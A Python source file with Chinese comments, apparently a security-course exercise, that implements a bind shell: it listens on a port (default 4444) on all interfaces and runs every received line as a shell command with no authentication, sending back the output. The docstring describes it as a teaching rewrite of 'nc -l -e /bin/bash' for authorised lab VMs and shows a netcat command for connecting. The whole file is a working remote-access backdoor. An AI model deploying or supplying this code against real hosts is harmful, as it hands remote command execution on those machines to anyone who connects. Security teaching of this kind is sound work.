#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Python bind shell（示例二 / 练习二）。

Bind Shell 指在“目标主机”上启动一个服务端程序，它监听指定端口并等待连接；
连接成功后，客户端即可获得一个远程命令行，从而在目标主机上执行命令。
这是重写 netcat ``nc -l -e /bin/bash`` 的一个教学实现。

**仅供已授权的信息安全课程实验使用（例如隔离的虚拟机环境）。**
请勿在未经授权的主机上运行，否则可能触犯法律。

用法::

    # 目标机（被控端，例如虚拟机）
    python bindshell.py --port 4444

    # 控制端（宿主机），使用 netcat 连接
    nc <目标机IP> 4444

新增参数：

* ``--port / -p``     监听端口（默认 4444）；
* ``--threaded / -t`` 多线程模式，可同时服务多个连接。

作者：<你的姓名 / 学号>
日期：2026-10-14
"""

from __future__ import annotations

import socket
import subprocess
from threading import Thread

import click

# 单次 recv 读取的字节数
BUFFER_SIZE = 2048


def run_cmd(cmd: str) -> bytes:
    """在本地执行一条 shell 命令并返回其标准输出（bytes）。"""
    output = subprocess.run(
        cmd,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        shell=True,
    )
    return output.stdout


def recv_command(client_socket: socket.socket) -> str:
    """从客户端读取一条以换行符结尾的命令，返回去掉结尾换行后的字符串。

    TCP 是“字节流”，一条命令可能被拆成多个数据包，因此需要循环接收，
    直到读到换行符 ``\\n``（或连接关闭）为止。
    """
    chunks: list[bytes] = []
    chunk = client_socket.recv(BUFFER_SIZE)
    chunks.append(chunk)

    while len(chunk) != 0 and chr(chunk[-1]) != "\n":
        chunk = client_socket.recv(BUFFER_SIZE)
        chunks.append(chunk)

    # 拼接所有分片，解码，并去掉结尾的换行符
    command = b"".join(chunks).decode(errors="replace")[:-1]
    return command


def handle_client(client_socket: socket.socket) -> None:
    """处理单个客户端的命令循环。"""
    while True:
        try:
            cmd = recv_command(client_socket)
        except (ConnectionResetError, BrokenPipeError):
            break

        if cmd.strip().lower() == "exit":
            client_socket.close()
            break

        output = run_cmd(cmd)
        client_socket.sendall(output)


def serve(port: int, threaded: bool) -> None:
    """启动 bind shell 服务端，监听 ``port`` 端口。"""
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(("0.0.0.0", port))
    server.listen(4)
    click.echo(f"[*] Listening on 0.0.0.0:{port} (threaded={threaded})",
               err=True)

    while True:
        client_socket, address = server.accept()
        click.echo(f"[*] Accepted connection from {address[0]}:{address[1]}",
                   err=True)

        if threaded:
            # 每来一个连接就新开一个线程，主线程继续 accept 下一个连接
            worker = Thread(target=handle_client, args=(client_socket,))
            worker.daemon = True
            worker.start()
        else:
            handle_client(client_socket)
            click.echo("[*] Connection closed.", err=True)


@click.command()
@click.option(
    "--port", "-p",
    default=4444,
    show_default=True,
    type=int,
    help="Port to listen on.",
)
@click.option(
    "--threaded/--no-threaded", "-t",
    default=False,
    show_default=True,
    help="Handle multiple clients concurrently.",
)
def main(port: int, threaded: bool) -> None:
    """启动一个 bind shell 服务端。"""
    serve(port, threaded)


if __name__ == "__main__":
    main()
